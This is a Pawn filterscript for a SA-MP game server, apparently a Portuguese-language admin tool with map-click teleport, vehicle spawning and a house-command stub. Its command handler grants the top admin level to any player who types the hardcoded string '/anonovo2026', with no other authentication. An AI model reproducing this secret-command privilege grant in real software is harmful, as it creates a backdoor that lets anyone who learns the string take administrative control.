#define FILTERSCRIPT
#include <a_samp>

#define NIVEL_MASTER 6

public OnFilterScriptInit() {
    print("--------------------------------------");
    print("   ADMIN MASTER 2026 - CORRIGIDO      ");
    print("--------------------------------------");
    return 1;
}

public OnPlayerClickMap(playerid, Float:fX, Float:fY, Float:fZ) {
    if(GetPVarInt(playerid, "AdminLevel") == NIVEL_MASTER || IsPlayerAdmin(playerid)) {
        SetPlayerPosFindZ(playerid, fX, fY, fZ);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Teleportado!");
    }
    return 1;
}

public OnPlayerCommandText(playerid, cmdtext[]) {
    
    // --- ATIVAÇÃO MASTER ---
    if(!strcmp(cmdtext, "/anonovo2026", true)) {
        SetPVarInt(playerid, "AdminLevel", NIVEL_MASTER);
        SendClientMessage(playerid, 0x00FF00FF, "[ADMIN] Poderes MASTER 2026 ativados!");
        return 1;
    }

    if(GetPVarInt(playerid, "AdminLevel") < NIVEL_MASTER && !IsPlayerAdmin(playerid)) return 0;

    // --- COMANDO DE CARRO (ESTABILIZADO) ---
    if(!strfind(cmdtext, "/carro", true)) {
        new vID, c1, c2, p;
        p = strfind(cmdtext, " ", true);
        if(p == -1) return SendClientMessage(playerid, -1, "Use: /carro [ID] [Cor1] [Cor2]");
        
        vID = strval(cmdtext[p+1]);
        p = strfind(cmdtext, " ", true, p+1);
        if(p == -1) { c1 = 1; c2 = 1; }
        else {
            c1 = strval(cmdtext[p+1]);
            p = strfind(cmdtext, " ", true, p+1);
            if(p == -1) c2 = 1;
            else c2 = strval(cmdtext[p+1]);
        }

        if(vID < 400 || vID > 611) return SendClientMessage(playerid, -1, "ID Invalido.");

        new Float:pX, Float:pY, Float:pZ, Float:pA;
        GetPlayerPos(playerid, pX, pY, pZ); 
        GetPlayerFacingAngle(playerid, pA);

        new v = CreateVehicle(vID, pX, pY, pZ + 2.5, pA, c1, c2, -1);
        SetVehicleVelocity(v, 0.0, 0.0, 0.0);
        SetVehicleAngularVelocity(v, 0.0, 0.0, 0.0);
        PutPlayerInVehicle(playerid, v, 0);
        return 1;
    }

    // --- COMANDO CRIAR CASA (CORRIGIDO PARA NÃO CAUSAR CRASH) ---
    if(!strfind(cmdtext, "/criarcasa", true)) {
        // Agora o comando apenas avisa. O comando REAL que cria é o /sethouse
        // que está no seu arquivo filterscripts/casas.pwn
        SendClientMessage(playerid, 0xFFFF00FF, "[INFO] Use o comando direto: /sethouse [ID]");
        SendClientMessage(playerid, -1, "O sistema de casas e o de admin devem estar ligados juntos.");
        return 1;
    }

    return 0;
}
